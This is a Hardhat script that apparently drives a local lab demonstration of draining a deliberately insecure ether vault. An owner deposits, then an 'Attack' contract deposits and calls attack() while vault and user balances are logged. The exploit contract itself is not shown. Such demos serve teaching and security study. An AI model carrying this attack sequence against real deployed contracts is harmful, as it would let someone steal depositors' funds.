import { ethers } from "hardhat";

async function main() {
  let time = Date.now();
  const AMOUNT = ethers.parseEther("1"); //bignumber

  const [owner, attacker] = await ethers.getSigners();
  let vault = await ethers.getContractAt(
    "InsecureEtherVault",
    "0x610178dA211FEF7D417bC0e6FeD39F05609AD788",
    // make sure this address is the address you just deployed
    owner,
  );

  let attack = await ethers.getContractAt(
    "Attack",
    "0xA51c1fc2f0D1a1b8494Ed1FE312d7C3a78Ed91C0",
    // make sure this address is the address you just deployed
    attacker,
  );

  console.log("--- owner deposit ---");

  const txn1 = await vault.connect(owner).deposit({ value: AMOUNT });
  // await txn1.wait(1);
  console.log(
    "vault balance: ",
    await vault.connect(attacker).getEtherBalance(),
  );
  console.log("owner balance: ", await vault.getUserBalance(owner.address));

  console.log("--- attack contract deposit ---");

  const txn2 = await attack.connect(attacker).deposit({ value: AMOUNT });
  // await txn2.wait(1);
  console.log(
    "vault balance: ",
    await vault.connect(attacker).getEtherBalance(),
  );
  console.log("owner balance: ", await vault.getUserBalance(owner.address)); //bug
  console.log(
    "attack contract balance: ",
    await vault.getUserBalance(await attack.getAddress()),
  );

  console.log("--- attacker contract withdraw ---");
  const txn3 = await attack.connect(attacker).attack();
  // await txn3.wait(1);
  console.log(
    "vault balance: ",
    await vault.connect(attacker).getEtherBalance(),
  );
  console.log("owner balance: ", await vault.getUserBalance(owner.address));
  console.log(
    "attack contract balance: ",
    await vault.getUserBalance(await attack.getAddress()),
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
